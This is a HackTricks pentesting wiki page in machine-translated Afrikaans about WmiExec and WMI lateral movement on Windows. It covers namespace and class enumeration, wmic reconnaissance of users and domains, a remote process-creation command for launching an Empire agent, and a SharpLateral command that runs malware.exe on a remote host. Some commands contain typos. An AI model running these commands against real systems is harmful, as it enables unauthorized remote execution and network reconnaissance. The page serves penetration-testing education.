# WmiExec

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Hoe Dit Werk

Proses kan op gasheer oopgemaak word waar die gebruikersnaam en óf wagwoord of hash bekend is deur die gebruik van WMI. Opdragte word uitgevoer met behulp van WMI deur Wmiexec, wat 'n semi-interaktiewe skaalervaring bied.

**dcomexec.py:** Deur verskillende DCOM eindpunte te benut, bied hierdie skrip 'n semi-interaktiewe skaal soortgelyk aan wmiexec.py, spesifiek die ShellBrowserWindow DCOM objek. Dit ondersteun tans MMC20. Toepassing, Shell Windows, en Shell Browser Window objek. (bron: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI Grondbeginsels

### Namespace

Gestructureer in 'n gids-styl hiërargie, is WMI se topvlak houer \root, waaronder addisionele gidse, bekend as namespaces, georganiseer is.
Opdragte om namespaces te lys:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klasse binne 'n naamruimte kan gelys word met:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klasses**

Om 'n WMI-klasnaam te ken, soos win32\_process, en die naamruimte waarin dit woon, is noodsaaklik vir enige WMI-operasie.  
Opdragte om klasse te lys wat met `win32` begin:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Aanroep van 'n klas:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metodes

Metodes, wat een of meer uitvoerbare funksies van WMI klasse is, kan uitgevoer word.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Opname

### WMI Diensstatus

Opdragte om te verifieer of die WMI-diens operasioneel is:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Stelsels en Proses Inligting

Versameling van stelsels en proses inligting deur WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Vir aanvallers is WMI 'n kragtige hulpmiddel om sensitiewe data oor stelsels of domeine te enumerate.
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Remote querying of WMI vir spesifieke inligting, soos plaaslike admins of ingelogde gebruikers, is haalbaar met sorgvuldige opdragkonstruksie.

### **Handmatige Afgeleë WMI Vraestelling**

Stealthy identifikasie van plaaslike admins op 'n afgeleë masjien en ingelogde gebruikers kan bereik word deur spesifieke WMI-vrae. `wmic` ondersteun ook die lees van 'n tekslêer om opdragte op verskeie nodes gelyktydig uit te voer.

Om 'n proses afgeleë oor WMI uit te voer, soos om 'n Empire-agent te ontplooi, word die volgende opdragstruktuur gebruik, met suksesvolle uitvoering aangedui deur 'n terugwaarde van "0":
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Hierdie proses illustreer WMI se vermoë vir afstandsuitvoering en stelselnommering, wat die nut daarvan vir beide stelselnavorsing en penetrasietoetsing beklemtoon.

## References
* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Automatic Tools

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
{% endcode %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
